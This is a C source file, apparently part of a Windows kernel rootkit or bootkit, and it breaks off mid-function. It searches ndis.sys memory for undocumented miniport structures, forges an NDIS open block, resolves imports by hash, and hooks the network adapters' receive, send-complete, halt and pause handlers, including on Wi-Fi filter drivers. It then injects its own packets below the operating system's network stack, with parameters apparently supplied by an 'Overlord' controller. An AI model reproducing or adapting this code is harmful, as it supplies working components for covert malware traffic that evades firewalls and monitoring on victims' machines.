
#define NDIS_SIZEOF_NET_BUFFER_LIST_POOL_PARAMETERS_REVISION_1 RTL_SIZEOF_THROUGH_FIELD(NET_BUFFER_LIST_POOL_PARAMETERS, DataSize)

bool_t network_search_for_adapters()
{
    NDIS_STATUS ndisStatus;
    pndis_adapter_t pAdapter, pTmpAdapter;
    NET_BUFFER_LIST_POOL_PARAMETERS nblPoolParams;
    uint32_t flags;
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdr;
    PIMAGE_SECTION_HEADER sectHdr;
    uint16_t i, sectionNum;
    pvoid_t *itr, *end;
    pvoid_t content;
    uint8_t* pNdisMiniportBlock = NULL;
    BOOLEAN isOK;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pNetworkBlock->needReconfigure = TRUE;
    pGlobalBlock->pNetworkBlock->pHeadAdapter = NULL;

    // Сканируем адаптеры.

    FnKdPrint(("Scan for network adapters ...\n"));

    dosHdr = (PIMAGE_DOS_HEADER)pGlobalBlock->pNetworkBlock->ndisBase;
    ntHdr = (PIMAGE_NT_HEADERS)(pGlobalBlock->pNetworkBlock->ndisBase + dosHdr->e_lfanew);
    sectHdr = IMAGE_FIRST_SECTION(ntHdr);
    sectionNum = ntHdr->FileHeader.NumberOfSections;
    for (i = 0; i < sectionNum; ++i) {
        if (sectHdr->Name[0] == '.' && (sectHdr->Characteristics  & (IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) == 
            (IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
            itr = (pvoid_t*)((uint8_t*)dosHdr + sectHdr->VirtualAddress);
            end = itr + sectHdr->Misc.VirtualSize / sizeof(pvoid_t);

            for ( ; itr < end; ++itr) {
                // Проверка критериев, по которым мы можем понять, что нашли указатель на структуру _NDIS_MINIPORT_BLOCK
                content = *itr;
                if (pGlobalBlock->pCommonBlock->fnisValidPointer(content) && pGlobalBlock->pCommonBlock->fnMmIsNonPagedSystemAddressValid(content)) { // Адрес принадлжеит неподкачиваемой памяти
                    // Проверяем базовый критерий
                    if (pGlobalBlock->osMajorVersion <= 5) {
                        if (*(uint32_t*)content == 0x504d444e) {
                            pNdisMiniportBlock = content;
                            break;
                        }
                    }
                    else {
                        if (*(uint16_t*)content == 0x0111) { // _NDIS_OBJECT_HEADER.Type = 11h, _NDIS_OBJECT_HEADER.Revision = 1
                            pNdisMiniportBlock = content;
                            break;
                        }
                    }
                }
            }

            if (pNdisMiniportBlock != NULL) {
                // Пост-проверка критериев (пока отсуствует)
                pGlobalBlock->pNdisMiniports = itr;
                break;
            }
        }

        sectHdr = (PIMAGE_SECTION_HEADER)((uint8_t*)sectHdr + sizeof(IMAGE_SECTION_HEADER));
    }

    while (pNdisMiniportBlock != NULL) {
        PUNICODE_STRING pMiniportName;

        // Ищем адаптер среди уже найденных.
        pTmpAdapter = pGlobalBlock->pNetworkBlock->pHeadAdapter;
        while (pGlobalBlock->pCommonBlock->fnisValidPointer(pTmpAdapter)) {
            if (pTmpAdapter->pMiniBlock == pNdisMiniportBlock) {
                break;
            }
            pTmpAdapter = pTmpAdapter->pNext;
        }

        if (pTmpAdapter == NULL) {
            pMiniportName = (PUNICODE_STRING)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMiniportName);

            isOK = TRUE;
            pAdapter = NULL;

            // Считываем из реестра данные по найденному сетевому адаптеру.
            pGlobalBlock->pNetworkBlock->fnRegistryFindAdapterInfo(pMiniportName, &pAdapter);

            flags = *(uint32_t*)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisFlags);
            if (pAdapter != NULL && (flags & NDIS_FLAGS_MEDIA_CONNECTED) /*&& (flags & NDIS_FLAGS_BUS_MASTER)*/) {
                pAdapter->pMiniBlock = pNdisMiniportBlock;
                pAdapter->flags = flags;
                pAdapter->pMiniAdapterCtx = *(NDIS_HANDLE*)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMpAdapterContext);
                pAdapter->physMediumType = *(uint32_t*)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisPhysicalMediumType);
                pAdapter->ndisMajorVersion = *(uint8_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisMajorVersion);
                if (pAdapter->ndisMajorVersion > 6) {
                    pAdapter->ndisMajorVersion = 6;
                }

//                 // Ищем базу драйвера сетевой карты.
//                 pIntr = *(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisInterrupt);
// 
//                 if (!pGlobalBlock->pCommonBlock->fnisValidPointer(pIntr)) {
//                     pIntr = *(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisInterruptEx);
//                 }
// 
//                 if (pGlobalBlock->pCommonBlock->fnisValidPointer(pIntr)) {
//                     pAdapter->pMiniportDpc = *(uint8_t**)(pIntr + pGlobalBlock->pNetworkBlock->dwNdisMiniportDpc);
//                     pAdapter->pModuleBase = pGlobalBlock->pCommonBlock->fnfindModuleBaseByInnerPtr(pAdapter->pMiniportDpc);
//                 }

                if (pAdapter->ndisMajorVersion == 5) {
                    if (pGlobalBlock->osMajorVersion <= 5) {
                        pAdapter->pOpenBlock = *(pvoid_t*)(*(uint8_t**)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisEthDB) + pGlobalBlock->pNetworkBlock->dwNdisOpenList) + pGlobalBlock->pNetworkBlock->dwNdisBindingHandle);
                        __movsb((uint8_t*)&pAdapter->zombiBlockXP, (const uint8_t*)pAdapter->pOpenBlock, sizeof(NDIS_OPEN_BLOCK/*zombi_ndis_open_block_xp_t*/));
                        pAdapter->zombiBlockXP.MiniportHandle = pNdisMiniportBlock;
                        pAdapter->zombiBlockXP.MiniportAdapterContext = pAdapter->pMiniAdapterCtx;
                        pAdapter->zombiBlockXP.WSendHandler = *(pvoid_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisMSendHandler);
                        pAdapter->zombiBlockXP.WSendPacketsHandler = *(pvoid_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisMSendPacketsHandles);
                        pAdapter->OriginalSendCompleteHandler = pAdapter->zombiBlockXP.SendCompleteHandler;
                        pAdapter->zombiBlockXP.SendCompleteHandler = (FARPROC)pGlobalBlock->pNetworkBlock->fnHookNdis5_OpenSendCompleteHandler;
                        pAdapter->zombiBlockXP.References = 0;

                        pGlobalBlock->pNetworkBlock->fnNdisMiniportSendPackets = *(pvoid_t*)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisSendPacketsHandler);
                        pAdapter->pSendHandle = &pAdapter->zombiBlockXP;
                    }
                    else {
                        pGlobalBlock->pNetworkBlock->fnNdisMiniportSendPackets = *(pvoid_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisMSendPacketsHandles);
                        pAdapter->pSendHandle = *(NDIS_HANDLE*)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMpAdapterContext);
                    }

                    if (pAdapter->flags & NDIS_FLAGS_DESERIALIZED) {
                        pGlobalBlock->pNetworkBlock->fnMiniportReturnPacket = *(pvoid_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisMReturnPacket);
                    }

                    pGlobalBlock->pNetworkBlock->fnNdisAllocatePacketPool(&ndisStatus, &pAdapter->packetPoolHandle, 70, PROTOCOL_RESERVED_SIZE_IN_PACKET);
                    if (ndisStatus != NDIS_STATUS_SUCCESS) {
                        break;
                    }

                    pGlobalBlock->pNetworkBlock->fnNdisAllocateBufferPool(&ndisStatus, &pAdapter->bufferPoolHandle, 70);
                    if (ndisStatus != NDIS_STATUS_SUCCESS) {
                        pGlobalBlock->pNetworkBlock->fnNdisFreePacketPool(pAdapter->packetPoolHandle);
                        break;
                    }
                }
                else {
                    pGlobalBlock->pCommonBlock->fnmemset(&nblPoolParams, 0, sizeof(nblPoolParams));
                    nblPoolParams.Header.Type = NDIS_OBJECT_TYPE_DEFAULT;
                    nblPoolParams.Header.Revision = NET_BUFFER_LIST_POOL_PARAMETERS_REVISION_1;
                    nblPoolParams.Header.Size = NDIS_SIZEOF_NET_BUFFER_LIST_POOL_PARAMETERS_REVISION_1;
                    nblPoolParams.ProtocolId = 0;
                    nblPoolParams.fAllocateNetBuffer = TRUE;
                    nblPoolParams.ContextSize = sizeof(SEND_RSVD);
                    nblPoolParams.PoolTag = LOADER_TAG;

                    pAdapter->nbPoolHandle = pGlobalBlock->pNetworkBlock->fnNdisAllocateNetBufferListPool((NDIS_HANDLE)pNdisMiniportBlock, &nblPoolParams);

                    if (pAdapter->physMediumType == NdisPhysicalMediumNative802_11) {
                        uint8_t* pFilterBlock;
                        uint8_t* pFilterDriverBlock;
                        // Цепляемся к фильтр-драйверу Native WiFi Filter Driver (nwifi.sys).

                        isOK = FALSE;

                        // Ищем нужный фильтр-блок.
                        pFilterBlock = *(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisLowestFilter);
                        while (pFilterBlock != NULL) {
                            PDRIVER_OBJECT pDriverObject;
                            pFilterDriverBlock = *(uint8_t**)(pFilterBlock + pGlobalBlock->pNetworkBlock->dwNdisFilterDriver);
                            if (pFilterDriverBlock != NULL) {
                                pDriverObject = *(PDRIVER_OBJECT*)(pFilterDriverBlock + pGlobalBlock->pNetworkBlock->dwNdisDriverObject);
                                if (pGlobalBlock->pCommonBlock->fncommon_calc_hash((uint8_t*)pDriverObject->DriverName.Buffer, pDriverObject->DriverName.Length) == 0x83e33d10/*\Driver\NativeWifiP*/) {
                                    uint8_t* realBase;
                                    uint8_t* mappedBase;

                                    mappedBase = pGlobalBlock->pCommonBlock->fncommon_map_driver(pGlobalBlock->pNetworkBlock->nwifi);
                                    realBase = pAdapter->pNwifiBase = pGlobalBlock->pCommonBlock->fncommon_get_base_from_dirver_object(*(PDRIVER_OBJECT*)(pFilterDriverBlock + pGlobalBlock->pNetworkBlock->dwNdisWiFiDriverObject), NULL);
                                    if (mappedBase != NULL && realBase != NULL) {
                                        pAdapter->ppNdisIndicateNBLHandler = (pvoid_t*)pGlobalBlock->pCommonBlock->fncommon_get_import_address(mappedBase, realBase, 0x19c29ea3/*NDIS.SYS*/, 0x8F64F964/*NdisFIndicateReceiveNetBufferLists*/);
                                        pAdapter->ppNdisSndNetBufLstsCmptHandler = (pvoid_t*)pGlobalBlock->pCommonBlock->fncommon_get_import_address(mappedBase, realBase, 0x19c29ea3/*NDIS.SYS*/, 0xA11539CF/*NdisFSendNetBufferListsComplete*/);

                                        isOK = (pAdapter->ppNdisIndicateNBLHandler != NULL && pAdapter->ppNdisSndNetBufLstsCmptHandler != NULL);

                                        if (isOK) {
                                            pGlobalBlock->pNetworkBlock->fnNdisSendNetBufferLists = *(pvoid_t*)(pFilterDriverBlock + pGlobalBlock->pNetworkBlock->dwNdisWiFiSendNetBufferListsHandler);
                                            pGlobalBlock->pNetworkBlock->fnNdisReturnNetBufferLists = *(pvoid_t*)(pFilterDriverBlock + pGlobalBlock->pNetworkBlock->dwNdisWiFiReturnNetBufferListsHandler);
                                            pAdapter->SourceHandle = pAdapter->pSendHandle = *(NDIS_HANDLE*)(pFilterBlock + pGlobalBlock->pNetworkBlock->dwNdisFilterModuleContext);
                                            pAdapter->pFilterBlock = pFilterBlock;
                                        }

                                        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(mappedBase, LOADER_TAG);
                                    }
                                    break;
                                }
                            }
                            pFilterBlock = *(uint8_t**)(pFilterBlock + pGlobalBlock->pNetworkBlock->dwNdisHigherFilter);
                        } 
                    }
                    else {
                        pGlobalBlock->pNetworkBlock->fnNdisSendNetBufferLists = *(pvoid_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisSendNetBufferLists);
                        pGlobalBlock->pNetworkBlock->fnNdisReturnNetBufferLists = *(pvoid_t*)(*(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisReturnNetBufferLists);
                        pAdapter->pSendHandle = *(NDIS_HANDLE*)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisMpAdapterContext);
                        pAdapter->SourceHandle = pNdisMiniportBlock;
                    }
                }

                if (isOK) {
                    // Добавляем адаптер в конец списка адаптеров.
                    if (pGlobalBlock->pNetworkBlock->pHeadAdapter == NULL) {
                        pGlobalBlock->pNetworkBlock->pHeadAdapter = pAdapter;
                    }
                    else {
                        pTmpAdapter = pGlobalBlock->pNetworkBlock->pHeadAdapter;
                        while (pTmpAdapter->pNext != NULL) {
                            pTmpAdapter = pTmpAdapter->pNext;
                        }
                        pTmpAdapter->pNext = pAdapter;
                    }
                }
                else {
                    pGlobalBlock->pNetworkBlock->fnnetwork_destroy_adapter(pAdapter);
                }
            }
        }

        pNdisMiniportBlock = *(uint8_t**)(pNdisMiniportBlock + pGlobalBlock->pNetworkBlock->dwNdisNextGlobalMiniport);

        if (!pGlobalBlock->pCommonBlock->fnisValidPointer(pNdisMiniportBlock) || !pGlobalBlock->pCommonBlock->fnMmIsNonPagedSystemAddressValid(pNdisMiniportBlock)) {
            break;
        }

        if (pGlobalBlock->osMajorVersion <= 5) {
            if (*(uint32_t*)pNdisMiniportBlock != 0x504d444e) {
                break;
            }
        }
        else {
            if (*(uint16_t*)pNdisMiniportBlock != 0x0111) { // _NDIS_OBJECT_HEADER.Type = 11h, _NDIS_OBJECT_HEADER.Revision = 1
                break;
            }
        }
    }

    return (pGlobalBlock->pNetworkBlock->pHeadAdapter != NULL);
}

bool_t network_plug_next_adapter()
{
    pndis_adapter_t pAdapter;
    pvoid_t pNdisFlags, pNdisAdapterContext, pNdisMediumType;
    USE_GLOBAL_BLOCK

    do {
        if (pGlobalBlock->pNetworkBlock->pActiveAdapter == NULL) {
            pAdapter = pGlobalBlock->pNetworkBlock->pActiveAdapter = pGlobalBlock->pNetworkBlock->pHeadAdapter;
        }
        else {
            pAdapter = pGlobalBlock->pNetworkBlock->pActiveAdapter = pGlobalBlock->pNetworkBlock->fnnetwork_destroy_adapter(pGlobalBlock->pNetworkBlock->pActiveAdapter);
        }

        // Проверяем существование адаптера
        if (pAdapter == NULL) {
            pGlobalBlock->pNetworkBlock->pHeadAdapter = NULL;
            return FALSE;
        }
        
        pNdisFlags = (pvoid_t)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisFlags);
        pNdisAdapterContext = (pvoid_t)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisMpAdapterContext);
        pNdisMediumType = (pvoid_t)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisPhysicalMediumType);

        if (!pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pNdisFlags) ||
            !pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pNdisAdapterContext) ||
            !pGlobalBlock->pCommonBlock->fnMmIsAddressValid(pNdisMediumType) ||
            *(uint32_t*)(pNdisFlags) != pAdapter->flags ||
            *(NDIS_HANDLE*)(pNdisAdapterContext) != pAdapter->pMiniAdapterCtx ||
            *(uint32_t*)(pNdisMediumType) != pAdapter->physMediumType) {
            pGlobalBlock->pNetworkBlock->pHeadAdapter = NULL;
            return FALSE;
        }

        // Проверяем доступность параметров от Overlord-а.
        if (pGlobalBlock->pCommonBlock->adaptersCount > 0) {
            uint32_t i, j;

            for (i = 0; i < pGlobalBlock->pCommonBlock->adaptersCount; ++i) {
                padapter_entry_t pAdapterEntry = &pGlobalBlock->pCommonBlock->pAdapters[i];
                if (pAdapterEntry->ip == pAdapter->ipAddr) {
                    struct etharp_entry* pEthArpEntry = &pGlobalBlock->pTcpipBlock->arp_table[0];

                    __movsb(pAdapter->macAddr, pAdapterEntry->mac, ETHARP_HWADDR_LEN);

                    for (j = 0; j < pAdapterEntry->arpEntriesCount; ++j) {
                        parp_entry_t pArpEntry = (parp_entry_t)((uint8_t*)pGlobalBlock->pCommonBlock->pAdapters + pAdapterEntry->arpEntryOffset + j * sizeof(arp_entry_t));

                        if (pArpEntry->ip == pAdapterEntry->gateway) {
                            pEthArpEntry->ipaddr.addr = pAdapterEntry->gateway;
                            __movsb((uint8_t*)&pEthArpEntry->ethaddr, pArpEntry->mac, ETHARP_HWADDR_LEN);
                            __movsb((uint8_t*)&pEthArpEntry[1], (uint8_t*)&pGlobalBlock->pTcpipBlock->arp_table[0], sizeof(struct etharp_entry));
                            __movsb((uint8_t*)&pEthArpEntry[2], (uint8_t*)&pGlobalBlock->pTcpipBlock->arp_table[0], sizeof(struct etharp_entry));
                            pAdapter->isComplete = 1;
                        }

                        if (pAdapter->ipNameServers[0] != 0 && pAdapter->ipNameServers[0] == pArpEntry->ip) {
                            if ((pArpEntry->ip & pAdapter->ipMask) == (pAdapter->ipAddr & pAdapter->ipMask)) {
                                pEthArpEntry[1].ipaddr.addr = pArpEntry->ip;
                                __movsb((uint8_t*)&pEthArpEntry[1].ethaddr, pArpEntry->mac, ETHARP_HWADDR_LEN);
                            }
                        }

                        if (pAdapter->ipNameServers[1] != 0 && pAdapter->ipNameServers[1] == pArpEntry->ip) {
                            if ((pArpEntry->ip & pAdapter->ipMask) == (pAdapter->ipAddr & pAdapter->ipMask)) {
                                pEthArpEntry[2].ipaddr.addr = pArpEntry->ip;
                                __movsb((uint8_t*)&pEthArpEntry[2].ethaddr, pArpEntry->mac, ETHARP_HWADDR_LEN);
                            }
                        }
                    }
                    break;
                }
            }
        }

        if (!pAdapter->isComplete) {
            LARGE_INTEGER delay;

            pGlobalBlock->pNetworkBlock->fnnetwork_validate_hooks();

            delay.QuadPart = -700000000I64; // 70 секунд
            pGlobalBlock->pCommonBlock->fnKeInitializeEvent(&pAdapter->dynDetectEvent, SynchronizationEvent, FALSE);
            pGlobalBlock->pNetworkBlock->fnnetwork_set_input_packet_handler(pGlobalBlock->pTcpipBlock->fntcpip_network_metrics_detector);

            // Ждём максимум 70 секунд, иначе у нас произошла какая-то херня.
            pGlobalBlock->pCommonBlock->fnKeWaitForSingleObject(&pAdapter->dynDetectEvent, Executive, KernelMode, FALSE, &delay);

            // Переводим обект в режим non-signaled, чтобы в случае выключения адаптера, можно было не боятся установить его.
            pGlobalBlock->pCommonBlock->fnKeClearEvent(&pAdapter->dynDetectEvent);
        }
    } while (!pAdapter->isComplete);

    return TRUE;
}

void network_confirm_active_adapter()
{
    pndis_adapter_t pAdapter;
    USE_GLOBAL_BLOCK

    for (pAdapter = pGlobalBlock->pNetworkBlock->pHeadAdapter; pAdapter != NULL; ) {
        if (pAdapter != pGlobalBlock->pNetworkBlock->pActiveAdapter) {
            pAdapter = pGlobalBlock->pNetworkBlock->fnnetwork_destroy_adapter(pAdapter);
        }
        else {
            pAdapter = pAdapter->pNext;
        }
    }

    pGlobalBlock->pNetworkBlock->pHeadAdapter = pGlobalBlock->pNetworkBlock->pActiveAdapter;
}

void network_validate_hooks()
{
    LARGE_INTEGER timeout;
    pndis_adapter_t pAdapter;
    USE_GLOBAL_BLOCK

    pAdapter = pGlobalBlock->pNetworkBlock->pActiveAdapter;

    if (pAdapter == NULL /*|| pGlobalBlock->pNetworkBlock->needReconfigure*/) {
        return;
    }

//     // Ждём 3 секунды, чтобы успел инициалилироваться объект потока, который мы будем ожидать.  
//     timeout.QuadPart = -30000000I64;
//     pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &timeout);

    timeout.QuadPart = -16000000I64;

    if (pAdapter->ndisMajorVersion == 5) {
        pAdapter->ppNdisHaltHandler = (pvoid_t*)(*(uint8_t**)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisHaltHandler);
        if (pAdapter->flags & NDIS_FLAGS_DESERIALIZED) {
            pAdapter->ppNdisPacketIndicateHandler = (pvoid_t*)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisPacketIndicateHandler);
            pAdapter->ppNdisMPSendCompleteHandler = (pvoid_t*)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisMPSendCompleteHandler);
        }
        else {
            pAdapter->ppNdisEthRxIndicateHandler = (pvoid_t*)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisEthRxIndicateHandler);
            pAdapter->ppNdisSendCompleteHandler = (pvoid_t*)(pAdapter->pOpenBlock + pGlobalBlock->pNetworkBlock->dwNdisSendCompleteHandler);
        }
    }
    else {
        pAdapter->ppNdisHaltHandler = (pvoid_t*)(*(uint8_t**)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisHaltHandler);
        pAdapter->ppNdisPauseHandler = (pvoid_t*)(*(uint8_t**)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisPauseHandler);
        pAdapter->ppNdisRestartHandler = (pvoid_t*)(*(uint8_t**)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisMDriverBlock) + pGlobalBlock->pNetworkBlock->dwNdisRestartHandler);

        if (pAdapter->physMediumType != NdisPhysicalMediumNative802_11) {
            pAdapter->ppNdisIndicateNBLHandler = (pvoid_t*)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisIndicateNBLHandler);
            pAdapter->ppNdisSndNetBufLstsCmptHandler = (pvoid_t*)(pAdapter->pMiniBlock + pGlobalBlock->pNetworkBlock->dwNdisSndNetBufLstsCmptHandler);
        }
    }

    // Восстанавливаем обработчики, если они были затёрты.
    if (pAdapter->ndisMajorVersion == 5) {
        if (!pGlobalBlock->pCommonBlock->fnisValidPointer(pAdapter->pMiniBlock) || !pGlobalBlock->pCommonBlock->fnMmIsNonPagedSystemAddressValid(pAdapter->pMiniBlock)) {
            pGlobalBlock->pNetworkBlock->needReconfigure = TRUE;
            return;
        }

        pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis5_HaltHandler, pAdapter->ppNdisHaltHandler, pAdapter, 1);
        if (pAdapter->flags & NDIS_FLAGS_DESERIALIZED) {
            pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis5_PacketIndicateHandler, pAdapter->ppNdisPacketIndicateHandler, pAdapter, 3);
            pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis5_SendCompleteHandler, pAdapter->ppNdisMPSendCompleteHandler, pAdapter, 3);
        }
        else {
            pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis5_EthRxIndicateHandler, pAdapter->ppNdisEthRxIndicateHandler, pAdapter, 8);
            pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis5_SendCompleteHandler, pAdapter->ppNdisSendCompleteHandler, pAdapter, 3);
        }
    }
    else {
        if (!pGlobalBlock->pCommonBlock->fnisValidPointer(pAdapter->pMiniBlock) || !pGlobalBlock->pCommonBlock->fnMmIsNonPagedSystemAddressValid(pAdapter->pMiniBlock)) {
            pGlobalBlock->pNetworkBlock->needReconfigure = TRUE;
            return;
        }

        pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis6_HaltHandler, pAdapter->ppNdisHaltHandler, pAdapter, 2);
        pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis6_PauseHandler, pAdapter->ppNdisPauseHandler, pAdapter, 2);
        pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis6_RestartHandler, pAdapter->ppNdisRestartHandler, pAdapter, 2);

        pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis6_ReceiveHandler, pAdapter->ppNdisIndicateNBLHandler, pAdapter, 5);
        pGlobalBlock->pNetworkBlock->fnHookNdisFunc(pGlobalBlock->pNetworkBlock->fnHookNdis6_MSendNetBufferListsComplete, pAdapter->ppNdisSndNetBufLstsCmptHandler, pAdapter, 3);
    }
}

void network_set_input_packet_handler(FnInputPacketHandler fnInputPacketHandler)
{
    USE_GLOBAL_BLOCK
    
    pGlobalBlock->pNetworkBlock->fnHookInternalReceiveHandler = fnInputPacketHandler;
}

uint8_t* network_allocate_packet_buffer(uint16_t len)
{
    uint8_t* pBuffer;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pNetworkBlock->fnNdisAllocateMemoryWithTag(&pBuffer, len, LOADER_TAG);

    return pBuffer;
}

//
// port related data structures
//
#define NDIS_DEFAULT_PORT_NUMBER ((NDIS_PORT_NUMBER)0)


#define NDIS_SEND_COMPLETE_FLAGS_DISPATCH_LEVEL 0x00000001
#define NDIS_SEND_FLAGS_DISPATCH_LEVEL 0x00000001
#define NDIS_SEND_FLAGS_CHECK_FOR_LOOPBACK              0x00000002

#define NdisSetNblFlag(_NBL, _F)                    ((_NBL)->NblFlags |= (_F))

#define NET_BUFFER_LIST_STATUS(_NBL)                ((_NBL)->Status)

#define NDIS_NBL_FLAGS_SEND_READ_ONLY                   0x00000001
#define NDIS_NBL_FLAGS_IS_IPV4                          0x00000200  // Packet is an IPv4 packet

// Gets the number of outstanding TCBs/NET_BUFFERs associated with
// this NET_BUFFER_LIST
#define SEND_REF_FROM_NBL(_NBL) (*((PLONG)&(_NBL)->MiniportReserved[1]))



typedef struct _NDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX
{
    NDIS_OBJECT_HEADER                   Header;
    struct _NDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX* NextEntry;
    ULONG                                Tag;
    PVOID                                Data;
} NDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX, *PNDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX;

#define NDIS_NBL_MEDIA_SPECIFIC_INFO_REVISION_1                 1

#define NDIS_SIZEOF_NBL_MEDIA_SPECIFIC_INFO_REVISION_1                                     \
    RTL_SIZEOF_THROUGH_FIELD(NDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX,Data)

#define NDIS_NBL_ADD_MEDIA_SPECIFIC_INFO_EX(_NBL, _MediaSpecificInfo)                      \
{                                                                                      \
    PNDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX HeadEntry;                                 \
    \
    HeadEntry = NET_BUFFER_LIST_INFO(_NBL, MediaSpecificInformationEx);                \
    NET_BUFFER_LIST_INFO((_NBL), MediaSpecificInformationEx) = (_MediaSpecificInfo);   \
    (_MediaSpecificInfo)->NextEntry = HeadEntry;                                       \
}

#define NDIS_NBL_REMOVE_MEDIA_SPECIFIC_INFO_EX(_NBL, _MediaSpecificInfo)                   \
{                                                                                      \
    PNDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX *HeadEntry;                                \
    HeadEntry = (PNDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX *)&(NET_BUFFER_LIST_INFO((_NBL), MediaSpecificInformationEx)); \
    for (; *HeadEntry != NULL; HeadEntry = &(*HeadEntry)->NextEntry)                   \
{                                                                                  \
    if ((*HeadEntry)->Tag == (_MediaSpecificInfo)->Tag)                            \
{                                                                              \
    *HeadEntry = (*HeadEntry)->NextEntry;                                      \
    break;                                                                     \
}                                                                              \
}                                                                                  \
}

#define NDIS_NBL_GET_MEDIA_SPECIFIC_INFO_EX(_NBL, _Tag, _MediaSpecificInfo)                \
{                                                                                      \
    PNDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX HeadEntry;                                 \
    (_MediaSpecificInfo) = NULL;                                                       \
    HeadEntry = (PNDIS_NBL_MEDIA_SPECIFIC_INFORMATION_EX)(NET_BUFFER_LIST_INFO((_NBL), MediaSpecificInformationEx)); \
    for (; HeadEntry != NULL; HeadEntry = HeadEntry->NextEntry)                        \
{                                                                                  \
    if (HeadEntry->Tag == (_Tag))                                                  \
{                                                                              \
    (_MediaSpecificInfo) = HeadEntry;                                          \
    break;                                                                     \
}                                                                              \
}                                                                                  \
}
int network_send_packet(uint8_t* pData, uint16_t len)
{
    int err = ERR_OK;
    NDIS_STATUS ndisStatus;
    pndis_adapter_t pAdapter;
    PHOOK_CONTEXT pHookContext;
    PSEND_RSVD pSendRsvd;
    USE_GLOBAL_BLOCK

    pAdapter = pGlobalBlock->pNetworkBlock->pActiveAdapter;

    if (pAdapter == NULL || pGlobalBlock->pNetworkBlock->needReconfigure || pAdapter->miniportPaused) {
        return ERR_IF;
    }

    do {
        if (pAdapter->ndisMajorVersion == 5) {
            PNDIS_BUFFER Buffer = NULL;
            PNDIS_PACKET Packet = NULL;

            pGlobalBlock->pNetworkBlock->fnNdisAllocateBuffer(&ndisStatus, &Buffer, pAdapter->bufferPoolHandle, pData, len);

            if (ndisStatus != NDIS_STATUS_SUCCESS) {
